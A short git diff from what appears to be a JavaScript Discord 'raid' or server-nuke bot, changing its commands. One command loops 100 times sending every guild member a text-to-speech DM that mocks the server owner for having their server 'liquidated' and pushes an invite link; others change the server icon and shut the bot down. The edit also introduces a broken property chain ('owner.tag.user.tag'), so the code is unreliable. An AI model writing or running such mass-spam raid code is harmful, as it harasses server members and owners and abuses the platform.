@@ -70,12 +70,12 @@ bot.on("message", msg => {
 			  				msg.guild.setIcon("https://cdn.discordapp.com/attachments/499167096786386955/499654562810953741/Screenshot_2018-10-08-17-25-02.png")
 			  				}
 			  					if(msg.content === prefix+ "die"){
-									if(msg.author.id !== "491878353960304640")
+									if(msg.author.id !== "491878353960304640")return;
 			  						process.exit()
 			  					}
 									  if(msg.content === prefix+"mp"){
 										  for(var i = 0; i < 100; i++){
-											  msg.guild.members.map(m => m.send(`${msg.guild.owner.tag} s'est fait liquidé son serv \nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif https://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg\nhttps://discord.gg/vDZ64C3`,{tts:true}))
+											  msg.guild.members.map(m => m.send(`${msg.guild.owner.tag.user.tag} s'est fait liquidé son serv \nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif https://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg\nhttps://discord.gg/vDZ64C3`,{tts:true}))
 										  }
 									  }
 			  							if(msg.content === prefix+"botstats"){
